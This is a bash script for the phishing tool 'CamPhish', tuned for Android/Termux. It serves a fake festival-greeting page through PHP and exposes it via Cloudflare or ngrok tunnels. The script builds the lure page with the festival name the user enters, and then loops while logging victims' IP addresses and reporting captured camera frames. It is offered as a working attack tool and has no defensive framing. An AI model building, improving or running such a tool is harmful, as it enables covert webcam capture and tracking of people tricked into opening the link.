#!/usr/bin/env bash
# CamPhish v2.0 — Festival Wishing Edition
# Optimized for Termux/Android

# ─── Windows compatibility ────────────────────────────────────────────────────
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || \
   [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "Windows system detected."
  function killall() { taskkill /F /IM "$1" 2>/dev/null; }
  function pkill()   {
    if [[ "$1" == "-f" ]]; then shift; shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

# ─── Safe kill helper (works even if killall/pkill not installed) ─────────────
_kill_proc() {
  local name="$1"
  # Try pkill first (procps), then killall, then kill via ps (busybox safe)
  pkill -9 -f "$name"    2>/dev/null && return
  killall -9 "$name"     2>/dev/null && return
  # Busybox fallback: find PID via ps and kill
  local pid
  pid=$(ps -A 2>/dev/null | grep "$name" | grep -v grep | awk '{print $1}' | head -n1)
  [[ -n "$pid" ]] && kill -9 "$pid" 2>/dev/null
}

trap 'printf "\n"; stop' 2

# ─── Banner ───────────────────────────────────────────────────────────────────
banner() {
  clear
  printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
  printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
  printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
  printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
  printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
  printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
  printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
  printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
  printf " \e[1;93m CamPhish Ver 2.0 \e[0m\n"
  printf " \e[1;77m Festival Wishing Edition — Termux Optimized \e[0m\n\n"
}

# ─── Dependencies check ───────────────────────────────────────────────────────
dependencies() {
  local missing=()
  command -v php  > /dev/null 2>&1 || missing+=("php")
  command -v wget > /dev/null 2>&1 || missing+=("wget")
  if [[ ${#missing[@]} -gt 0 ]]; then
    printf "\e[1;31m[!] Missing packages: %s\e[0m\n" "${missing[*]}"
    printf "\e[1;93m    Run: pkg install %s\e[0m\n" "${missing[*]}"
    exit 1
  fi
}

# ─── Stop / cleanup on Ctrl+C ─────────────────────────────────────────────────
stop() {
  printf "\e[1;92m[\e[0m*\e[1;92m] Stopping all services...\e[0m\n"
  if [[ "$windows_mode" == true ]]; then
    taskkill /F /IM "ngrok.exe"       2>/dev/null
    taskkill /F /IM "php.exe"         2>/dev/null
    taskkill /F /IM "cloudflared.exe" 2>/dev/null
  else
    _kill_proc "ngrok"
    _kill_proc "php"
    _kill_proc "cloudflared"
  fi
  printf "\e[1;92m[\e[0m*\e[1;92m] Done. Goodbye!\e[0m\n"
  exit 0
}

# ─── Wait for PHP server to be ready ─────────────────────────────────────────
wait_for_php() {
  local waited=0
  while [[ $waited -lt 10 ]]; do
    # Try to connect to the PHP server port
    if command -v curl > /dev/null 2>&1; then
      curl -s --max-time 1 http://127.0.0.1:3333 > /dev/null 2>&1 && return 0
    elif command -v wget > /dev/null 2>&1; then
      wget -q --timeout=1 -O /dev/null http://127.0.0.1:3333 > /dev/null 2>&1 && return 0
    fi
    sleep 1
    waited=$((waited + 1))
  done
  return 1
}

# ─── Catch IP ─────────────────────────────────────────────────────────────────
catch_ip() {
  # Save IFS and restore after — prevents leak into rest of script
  local OLD_IFS="$IFS"
  IFS=$'\n'
  local ips
  ips=$(grep 'IP:' ip.txt 2>/dev/null | cut -d ' ' -f2 | tr -d '\r')
  while IFS= read -r ip; do
    [[ -n "$ip" ]] && printf "\e[1;93m[\e[0m+\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
  done <<< "$ips"
  IFS="$OLD_IFS"
  cat ip.txt >> saved.ip.txt 2>/dev/null
  rm -f ip.txt
}

# ─── Wait / detection loop ────────────────────────────────────────────────────
checkfound() {
  printf "\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Link is LIVE — waiting for targets...\e[0m\n"
  printf "\e[1;92m[\e[0m*\e[1;92m] Camera capture is \e[0m\e[1;93mACTIVE\e[0m\n"
  printf "\e[1;77m    Press Ctrl+C to stop\e[0m\n\n"

  while true; do
    if [[ -e "ip.txt" ]]; then
      printf "\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\e[0m\n"
      catch_ip
    fi

    if [[ -e "Log.log" ]]; then
      printf "\e[1;92m[\e[0m+\e[1;92m] Camera frame captured!\e[0m\n"
      rm -f Log.log
    fi

    sleep 0.5
  done
}

# ─── Escape value for use in sed replacement ──────────────────────────────────
# Escapes &, \, and the delimiter (|) so sed doesn't misinterpret them
sed_escape() {
  printf '%s' "$1" | sed 's/[&\\/]/\\&/g; s/|/\\|/g'
}

# ─── Build payload files ──────────────────────────────────────────────────────
build_payload() {
  local link="$1"
  local name="$2"
  local escaped_link escaped_name
  escaped_link=$(sed_escape "$link")
  escaped_name=$(sed_escape "$name")

  # Landing redirect page
  sed "s|forwarding_link|${escaped_link}|g" template.php > index.php

  # Festival wishing page
  sed "s|forwarding_link|${escaped_link}|g" festivalwishes.html > index3.html
  sed "s|fes_name|${escaped_name}|g"        index3.html         > index2.html
  rm -f index3.html

  printf "\e[1;92m[\e[0m*\e[1;92m] Payload built for festival: \e[0m\e[1;93m%s\e[0m\n" "$name"
}

# ─── Download cloudflared binary ──────────────────────────────────────────────
download_cloudflared() {
  local arch os dl
  arch=$(uname -m)
  os=$(uname -s)
  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared (OS: %s, Arch: %s)...\e[0m\n" "$os" "$arch"

  if [[ "$windows_mode" == true ]]; then
    wget -q --no-check-certificate \
      "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" \
      -O cloudflared.exe
    [[ -e cloudflared.exe ]] || { printf "\e[1;31m[!] Download failed\e[0m\n"; exit 1; }
    chmod +x cloudflared.exe
    printf '#!/usr/bin/env bash\n./cloudflared.exe "$@"\n' > cloudflared
    chmod +x cloudflared

  elif [[ "$os" == "Darwin" ]]; then
    [[ "$arch" == "arm64" ]] \
      && dl="cloudflared-darwin-arm64.tgz" \
      || dl="cloudflared-darwin-amd64.tgz"
    wget -q --no-check-certificate \
      "https://github.com/cloudflare/cloudflared/releases/latest/download/$dl" -O cloudflared.tgz
    tar -xzf cloudflared.tgz && chmod +x cloudflared && rm -f cloudflared.tgz \
      || { printf "\e[1;31m[!] Extraction failed\e[0m\n"; exit 1; }

  else
    # Linux / Termux (Android)
    case "$arch" in
      x86_64)              dl="cloudflared-linux-amd64"  ;;
      i686|i386)           dl="cloudflared-linux-386"    ;;
      aarch64|arm64)       dl="cloudflared-linux-arm64"  ;;
      armv7l|armv6l|arm*)  dl="cloudflared-linux-arm"    ;;
      *)                   dl="cloudflared-linux-amd64"  ;;
    esac
    wget -q --no-check-certificate \
      "https://github.com/cloudflare/cloudflared/releases/latest/download/$dl" \
      -O cloudflared
    [[ -e cloudflared ]] || { printf "\e[1;31m[!] Download failed\e[0m\n"; exit 1; }
    chmod +x cloudflared
  fi
  printf "\e[1;92m[\e[0m+\e[1;92m] Cloudflared ready.\e[0m\n"
}

# ─── Cloudflare tunnel ────────────────────────────────────────────────────────
cloudflare_tunnel() {
  [[ -e cloudflared ]] || [[ -e cloudflared.exe ]] || download_cloudflared

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  if ! wait_for_php; then
    printf "\e[1;31m[!] PHP server failed to start. Is PHP installed?\e[0m\n"
    printf "\e[1;93m    Run: pkg install php\e[0m\n"
    exit 1
  fi
  printf "\e[1;92m[\e[0m+\e[1;92m] PHP server is ready.\e[0m\n"

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\e[0m\n"
  rm -f .cloudflared.log

  if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel --url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
  else
    ./cloudflared tunnel --url http://127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
  fi

  # Retry loop — up to 60 seconds for slow Android/Termux connections
  local link="" waited=0 max_wait=60
  printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for tunnel URL"
  while [[ -z "$link" && $waited -lt $max_wait ]]; do
    sleep 2
    waited=$((waited + 2))
    printf "."
    if [[ -e ".cloudflared.log" ]]; then
      link=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' ".cloudflared.log" | head -n1)
      # Broader fallback for alternate log formats
      [[ -z "$link" ]] && \
        link=$(grep -oE 'https://[^ "]+trycloudflare[^ "]+' ".cloudflared.log" | head -n1)
    fi
  done
  printf "\n"

  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Could not get tunnel URL after %ds. Possible reasons:\e[0m\n" "$max_wait"
    printf "\e[1;93m    - CloudFlare service is down\e[0m\n"
    printf "\e[1;93m    - On Android: enable mobile hotspot\e[0m\n"
    printf "\e[1;93m    - Stale process: killall cloudflared\e[0m\n"
    printf "\e[1;93m    - No internet connection\e[0m\n"
    printf "\e[1;93m    - Debug: cat .cloudflared.log\e[0m\n"
    exit 1
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Tunnel URL:\e[0m\e[1;77m %s\e[0m\n" "$link"
  build_payload "$link" "$fest_name"
  checkfound
}

# ─── Download ngrok binary ────────────────────────────────────────────────────
download_ngrok() {
  command -v unzip > /dev/null 2>&1 || { printf "\e[1;31m[!] unzip not found. Run: pkg install unzip\e[0m\n"; exit 1; }

  local arch os zf
  arch=$(uname -m)
  os=$(uname -s)
  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok (OS: %s, Arch: %s)...\e[0m\n" "$os" "$arch"
  local base="https://bin.equinox.io/c/bNyj1mQVY4c"

  if [[ "$windows_mode" == true ]]; then
    zf="ngrok-v3-stable-windows-amd64.zip"
  elif [[ "$os" == "Darwin" ]]; then
    [[ "$arch" == "arm64" ]] && zf="ngrok-v3-stable-darwin-arm64.zip" \
                              || zf="ngrok-v3-stable-darwin-amd64.zip"
  else
    case "$arch" in
      x86_64)              zf="ngrok-v3-stable-linux-amd64.zip" ;;
      i686|i386)           zf="ngrok-v3-stable-linux-386.zip"   ;;
      aarch64|arm64)       zf="ngrok-v3-stable-linux-arm64.zip" ;;
      armv7l|armv6l|arm*)  zf="ngrok-v3-stable-linux-arm.zip"   ;;
      *)                   zf="ngrok-v3-stable-linux-amd64.zip" ;;
    esac
  fi

  wget -q --no-check-certificate "$base/$zf" -O ngrok.zip
  unzip -q ngrok.zip && rm -f ngrok.zip \
    || { printf "\e[1;31m[!] Download/extraction failed\e[0m\n"; exit 1; }

  [[ "$windows_mode" == true ]] && chmod +x ngrok.exe || chmod +x ngrok
  printf "\e[1;92m[\e[0m+\e[1;92m] Ngrok ready.\e[0m\n"
}

# ─── Ngrok tunnel ─────────────────────────────────────────────────────────────
ngrok_server() {
  # curl is required for Ngrok API
  command -v curl > /dev/null 2>&1 || {
    printf "\e[1;31m[!] curl is required for Ngrok. Run: pkg install curl\e[0m\n"
    exit 1
  }

  [[ -e ngrok ]] || [[ -e ngrok.exe ]] || download_ngrok

  # Ngrok v3 config path (v2 fallback also checked)
  local cfg_v3="$HOME/.config/ngrok/ngrok.yml"
  local cfg_v2="$HOME/.ngrok2/ngrok.yml"
  local ngrok_cmd
  [[ "$windows_mode" == true ]] && ngrok_cmd="./ngrok.exe" || ngrok_cmd="./ngrok"

  if [[ -e "$cfg_v3" ]] || [[ -e "$cfg_v2" ]]; then
    printf "\e[1;93m[\e[0m*\e[1;93m] Existing Ngrok config found.\e[0m\n"
    read -r -p $'\e[1;92m[\e[0m+\e[1;92m] Change authtoken? [y/N]: \e[0m' chg_token
    if [[ "${chg_token,,}" == "y" ]]; then
      read -r -p $'\e[1;92m[\e[0m+\e[1;92m] Enter new authtoken: \e[0m' ngrok_auth
      $ngrok_cmd authtoken "$ngrok_auth" > /dev/null 2>&1
    fi
  else
    read -r -p $'\e[1;92m[\e[0m+\e[1;92m] Enter Ngrok authtoken: \e[0m' ngrok_auth
    $ngrok_cmd authtoken "$ngrok_auth" > /dev/null 2>&1
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\e[0m\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  if ! wait_for_php; then
    printf "\e[1;31m[!] PHP server failed to start.\e[0m\n"; exit 1
  fi
  printf "\e[1;92m[\e[0m+\e[1;92m] PHP server is ready.\e[0m\n"

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok tunnel...\e[0m\n"
  $ngrok_cmd http 3333 > /dev/null 2>&1 &

  # Retry loop for Ngrok — up to 30 seconds
  local link="" waited=0 max_wait=30
  printf "\e[1;92m[\e[0m*\e[1;92m] Waiting for Ngrok URL"
  while [[ -z "$link" && $waited -lt $max_wait ]]; do
    sleep 2
    waited=$((waited + 2))
    printf "."
    link=$(curl -s --max-time 2 http://127.0.0.1:4040/api/tunnels 2>/dev/null \
           | grep -oE 'https://[^"]*\.ngrok[^"]*\.app' | head -n1)
    # Fallback for older ngrok URL format
    [[ -z "$link" ]] && \
      link=$(curl -s --max-time 2 http://127.0.0.1:4040/api/tunnels 2>/dev/null \
             | grep -oE 'https://[0-9a-z]+\.ngrok\.io' | head -n1)
  done
  printf "\n"

  if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Could not get Ngrok URL. Possible reasons:\e[0m\n"
    printf "\e[1;93m    - Invalid or expired authtoken\e[0m\n"
    printf "\e[1;93m    - On Android: enable mobile hotspot\e[0m\n"
    printf "\e[1;93m    - Stale process: killall ngrok\e[0m\n"
    printf "\e[1;93m    - Try manually: ./ngrok http 3333\e[0m\n"
    exit 1
  fi

  printf "\e[1;92m[\e[0m*\e[1;92m] Tunnel URL:\e[0m\e[1;77m %s\e[0m\n" "$link"
  build_payload "$link" "$fest_name"
  checkfound
}

# ─── Main ─────────────────────────────────────────────────────────────────────
camphish() {
  rm -f sendlink 2>/dev/null

  # Ask festival name — loop until non-empty
  while true; do
    read -r -p $'\n\e[1;92m[\e[0m+\e[1;92m] Enter festival name (e.g. Diwali, Eid, Holi): \e[0m' fest_name
    # Trim leading/trailing whitespace only (preserve spaces inside the name)
    fest_name="${fest_name#"${fest_name%%[![:space:]]*}"}"
    fest_name="${fest_name%"${fest_name##*[![:space:]]}"}"
    [[ -n "$fest_name" ]] && break
    printf "\e[1;93m[!] Festival name cannot be empty. Try again.\e[0m\n"
  done

  # Choose tunnel — loop until valid input
  while true; do
    printf "\n\e[1;92m-----Choose tunnel server-----\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel \e[0m\e[1;77m[Recommended for Termux]\e[0m\n"
    read -r -p $'\n\e[1;92m[\e[0m+\e[1;92m] Choose [Default: 2]: \e[0m' option_server
    option_server="${option_server:-2}"

    # Validate: must be a number
    if ! [[ "$option_server" =~ ^[0-9]+$ ]]; then
      printf "\e[1;93m[!] Please enter 1 or 2.\e[0m\n"; continue
    fi

    if [[ $option_server -eq 2 ]]; then
      cloudflare_tunnel; break
    elif [[ $option_server -eq 1 ]]; then
      ngrok_server; break
    else
      printf "\e[1;93m[!] Invalid option. Enter 1 or 2.\e[0m\n"
    fi
  done
}

banner
dependencies
camphish
